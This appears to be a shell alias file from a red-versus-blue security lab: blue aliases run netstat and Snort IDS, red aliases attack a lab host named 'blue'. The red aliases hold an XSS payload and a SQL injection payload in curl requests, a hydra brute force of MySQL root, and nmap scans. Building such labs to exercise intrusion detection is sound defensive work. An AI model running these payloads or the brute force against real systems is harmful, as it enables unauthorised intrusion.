alias ll="ls -al"

# blue 
alias n="netstat -atnp"
alias s="snort -c /etc/snort/snort.conf -k none "
alias sa="snort -c /etc/snort/snort.conf -A console -k none" 
alias sav="snort -c /etc/snort/snort.conf -A console  -k none -v -d -C" 
alias sai="snort -c /etc/snort/snort_ips.conf -A console -v -C -k none"


alias v="vi /etc/snort/rules/snmp.rules"
alias v2="vi /etc/snort/rules/local.rules"


# red 
alias a1="nmap -sV blue" # Version detection, SNMPv3 GET
alias a2="ping -c1 blue"
alias a3="curl -i -L \"http://blue/pm.php?sub=newpm&uid=<script>alert()</script>\""
alias a4="curl -i -L \"http://blue\" -X POST"
alias a5="hydra -l root -P /500-worst-passwords.txt blue mysql"
alias a6="curl -i -L \"http://blue/pm.php?sub=newpm&uid=a%27%20OR%201%20%3D%201%20--\" -X GET"

alias a10="nmap -sV blue -p 80"

